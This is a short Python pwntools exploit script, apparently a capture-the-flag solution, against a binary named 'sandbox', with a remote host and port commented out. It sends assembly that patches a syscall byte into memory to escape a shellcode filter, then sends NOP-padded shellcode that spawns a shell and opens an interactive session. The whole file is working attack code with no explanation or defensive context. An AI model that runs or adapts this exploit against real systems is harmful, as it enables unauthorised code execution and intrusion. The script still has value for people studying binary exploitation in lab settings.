from pwn import *

p = process("./sandbox")
#r = remote('202.148.2.243', 3320)

context.arch = 'amd64'

payload = """
mov esi, 0x60106c
xor rdi, rdi
mov byte ptr [esi], 0x0f
"""

#gdb.attach(p, """
#				b *main
#				""")

payload = asm(payload)
payload += '\x00\x05' # \x00 byte yang akan diubah dengan \x0f
p.sendafter('> ', payload)

shell = '\x90'*2 + asm(shellcraft.sh())
p.sendline(shell)

p.interactive()